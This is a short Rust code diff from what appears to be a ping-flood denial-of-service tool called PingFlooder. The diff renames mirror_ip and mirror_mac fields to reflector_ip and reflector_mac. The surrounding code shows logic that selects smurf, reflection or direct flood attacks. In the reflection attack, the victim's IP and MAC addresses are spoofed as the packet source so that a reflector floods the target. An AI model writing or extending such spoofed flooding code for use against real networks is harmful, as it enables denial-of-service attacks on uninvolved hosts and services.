@@ -58,7 +58,7 @@ impl PingFlooder {
     fn set_pkt_info_for(&mut self) {
         if self.args.smurf {
             self.smurf_attack();
-        } else if self.args.mirror_ip.is_some() {
+        } else if self.args.reflector_ip.is_some() {
             self.reflection_attack();
         } else {
             self.direct_attack();
@@ -79,11 +79,11 @@ impl PingFlooder {
     fn reflection_attack(&mut self) {
         self.pkt_data.src_ip  = Some(self.args.target_ip);
         self.pkt_data.src_mac = self.resolve_mac(Some(self.args.target_mac.clone()));
-        self.pkt_data.dst_ip  = self.args.mirror_ip;
-        self.pkt_data.dst_mac = if self.args.mirror_mac.is_none() {
+        self.pkt_data.dst_ip  = self.args.reflector_ip;
+        self.pkt_data.dst_mac = if self.args.reflector_mac.is_none() {
                 None 
             } else {
-                self.resolve_mac(self.args.mirror_mac.clone())
+                self.resolve_mac(self.args.reflector_mac.clone())
             };
     }
 
